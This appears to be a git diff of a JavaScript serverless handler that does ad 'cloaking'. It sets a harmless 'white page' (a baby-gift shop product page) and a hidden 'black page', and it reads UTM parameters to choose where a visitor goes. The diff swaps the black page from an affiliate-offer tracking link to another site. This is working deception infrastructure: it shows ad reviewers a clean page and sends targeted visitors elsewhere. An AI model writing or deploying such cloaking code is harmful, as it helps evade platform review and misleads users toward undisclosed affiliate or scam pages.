@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://www.zaybabyshop.at/en/products/personalisierte-geschenk-zur-geburt-junge";
-    const blackPageURL = "https://uplevelrewarded.com/aff_c?offer_id=1232&aff_id=45076&source=scale";
+    const blackPageURL = "https://nowherehe.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
